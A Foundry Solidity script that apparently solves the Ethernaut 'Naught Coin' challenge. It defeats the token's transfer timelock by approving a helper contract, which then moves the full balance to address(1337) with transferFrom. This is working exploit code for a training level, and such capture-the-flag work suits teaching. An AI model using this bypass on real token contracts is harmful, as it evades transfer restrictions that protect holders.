// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

import {Script, console} from "forge-std/Script.sol";

contract Solver is Script {
    address naught_coin = vm.envAddress("NAUGHTCOIN_INSTANCE");

    function setUp() public {}

    function run() public {
        vm.startBroadcast(vm.envUint("PRIV_KEY"));

        uint256 current_balance;
        (, bytes memory data)= naught_coin.call(abi.encodeWithSignature("balanceOf(address)", vm.envAddress("MY_EOA_WALLET")));
        assembly {
            current_balance := mload(add(data, 32)) // get first 32 bytes data, this is naught coin balance of my EOA
        }

        Helper helper = new Helper();
        naught_coin.call(abi.encodeWithSignature("approve(address,uint256)", address(helper), current_balance));
        helper.clear_my_balance(naught_coin, current_balance);

        vm.stopBroadcast();
    }
}

contract Helper {
    function clear_my_balance(address token, uint256 amount) external {
        token.call(abi.encodeWithSignature("transferFrom(address,address,uint256)", msg.sender, address(1337), amount));
    }
}